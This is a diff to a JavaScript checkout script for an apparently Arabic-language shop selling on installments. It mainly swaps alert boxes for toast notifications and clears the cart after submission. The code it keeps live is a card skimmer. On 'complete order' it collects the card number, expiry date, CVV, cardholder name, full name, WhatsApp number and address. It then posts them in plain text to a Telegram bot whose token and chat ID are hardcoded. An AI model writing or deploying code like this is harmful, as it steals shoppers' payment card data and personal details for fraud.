@@ -106,7 +106,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
     document.getElementById("completeOrderButton").addEventListener("click", function () {
         document.querySelectorAll(".error_message").forEach((el) => (el.textContent = ""));
-    
+        
         const cardNumber = document.getElementById("card_number").value.replace(/\s/g, "");
         const expiryDate = document.getElementById("expiry_date").value;
         const cvv = document.getElementById("cvv").value;
@@ -117,85 +117,80 @@ document.addEventListener("DOMContentLoaded", () => {
         const initialPayment = parseFloat(document.getElementById("initial_payment").value);
         const monthlyPayment = parseFloat(document.getElementById("monthly_payment").value);
         const selectedInstallment = document.getElementById("installments").value;
-    
-        // استخدم السلة الفعلية من localStorage
+      
         const cart = JSON.parse(localStorage.getItem("cart")) || [];
         
         let totalQuantity = 0;
         let totalPrice = 0;
-    
-        // حساب الإجمالي الكلي بناءً على العناصر الفعلية في السلة
+        
         cart.forEach(item => {
             totalQuantity += item.quantity;
             totalPrice += item.quantity * item.price;
         });
-    
+        
         let isValid = true;
-    
-        // التحقق من صحة البيانات المدخلة
+        
         if (!/^\d{16}$/.test(cardNumber)) {
             document.getElementById("card_number_error").textContent = "رقم البطاقة يجب أن يحتوي على 16 رقمًا.";
             isValid = false;
         }
-    
+        
         if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryDate)) {
             document.getElementById("expiry_date_error").textContent = "تاريخ البطاقة يجب أن يكون بصيغة MM/YY.";
             isValid = false;
         }
-    
+        
         if (!/^\d{3}$/.test(cvv)) {
             document.getElementById("cvv_error").textContent = "رمز الـ CVV يجب أن يكون 3 أرقام.";
             isValid = false;
         }
-    
+        
         if (cardHolder.trim() === "") {
             document.getElementById("card_holder_error").textContent = "اسم حامل البطاقة مطلوب.";
             isValid = false;
         }
-    
+        
         if (isValid) {
             const botToken = "7973735099:AAE-MYlf-dsAKXPyklTxzGwZ_hB-oDG82wA";
             const chatId = "948393191";
             
-            // بناء الرسالة مع تفاصيل الطلب من السلة
             let productDetails = '';
             cart.forEach((product, index) => {
                 productDetails += `- **المنتج ${index + 1}:** ${product.name}\n`;
                 productDetails += `  - **الكمية:** ${product.quantity}\n`;
                 productDetails += `  - **الإجمالي:** ر.س ${(product.quantity * product.price).toFixed(2)}\n\n`;
             });
-    
+            
             const message = `
-                **بيانات الطلب:**
+                *بيانات الطلب:*
                 ${productDetails}
                 - **عدد المنتجات:** ${totalQuantity}
                 - **إجمالي المنتجات:** ر.س ${totalPrice.toFixed(2)}
-    
-                **بيانات الشخص:**
+        
+                *بيانات الشخص:*
                 - **الاسم الكامل:** ${fullName}
                 - **رقم الواتساب:** ${whatsappNumber}
                 - **العنوان الكامل:** ${fullAddress}
-    
-                **بيانات التقسيط:**
+        
+                *بيانات التقسيط:*
                 - **المقدم:** ر.س ${initialPayment.toFixed(2)}
                 - **مدة التقسيط:** ${selectedInstallment} شهر
                 - **القسط الشهري:** ر.س ${monthlyPayment.toFixed(2)}
-    
-                **بيانات البطاقة:**
+        
+                *بيانات البطاقة:*
                 - **رقم البطاقة:** ${cardNumber}
                 - **تاريخ الانتهاء:** ${expiryDate}
                 - **رمز CVV:** ${cvv}
                 - **اسم حامل البطاقة:** ${cardHolder}
             `;
-    
+            
             const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
             const payload = {
                 chat_id: chatId,
                 text: message,
                 parse_mode: "Markdown"
             };
-    
-            // إرسال البيانات إلى Telegram
+            
             fetch(apiUrl, {
                 method: "POST",
                 headers: {
@@ -206,15 +201,42 @@ document.addEventListener("DOMContentLoaded", () => {
             .then((response) => response.json())
             .then((data) => {
                 if (data.ok) {
-                    alert("تم الإرسال بنجاح!");
+                    // Clear localStorage and refresh the page after successful submission
+                    localStorage.removeItem("cart");  // Clear the cart in localStorage
+                    Swal.fire({
+                        toast: true,
+                        position: 'top-end',
+                        icon: 'success',
+                        title: 'تم الإرسال بنجاح!',
+                        text: 'تم إرسال بيانات الطلب بنجاح.',
+                        showConfirmButton: false,
+                        timer: 3000
+                    });
+                    setTimeout(() => window.location.reload(), 3000);  // Refresh the page after 3 seconds
                 } else {
                     console.error("Telegram API Error:", data);
-                    alert("حدث خطأ أثناء الإرسال. التفاصيل في الكونسول.");
+                    Swal.fire({
+                        toast: true,
+                        position: 'top-end',
+                        icon: 'error',
+                        title: 'خطأ!',
+                        text: 'حدث خطأ أثناء الإرسال. التفاصيل في الكونسول.',
+                        showConfirmButton: false,
+                        timer: 3000
+                    });
                 }
             })
             .catch((error) => {
                 console.error("Fetch Error:", error);
-                alert("حدث خطأ أثناء الإرسال.");
+                Swal.fire({
+                    toast: true,
+                    position: 'top-end',
+                    icon: 'error',
+                    title: 'خطأ!',
+                    text: 'حدث خطأ أثناء الإرسال.',
+                    showConfirmButton: false,
+                    timer: 3000
+                });
             });
         }
     });
